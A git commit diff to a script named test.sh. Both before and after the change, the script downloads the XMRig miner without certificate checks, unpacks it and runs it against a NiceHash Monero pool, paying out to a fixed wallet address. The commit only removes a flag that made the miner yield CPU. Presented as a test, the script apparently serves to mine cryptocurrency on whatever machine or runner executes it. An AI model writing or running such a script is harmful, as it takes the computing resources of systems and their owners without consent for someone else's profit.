950d3ebc3b6f0b9dd3b665db17f46e175973696b
ourminiproject <109750680+ourminiproject@users.noreply.github.com>
2022-07-23 19:17:42 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,2 +1,2 @@
 #! /bin/bash
-wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbKryZnXPm1CWCfyYNGfuBZcXAMHrzjjXJ5 -p x -k --tls --rig-id GC-US --nicehash --cpu-no-yield
+wget --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbKryZnXPm1CWCfyYNGfuBZcXAMHrzjjXJ5 -p x -k --tls --rig-id GC-US --nicehash
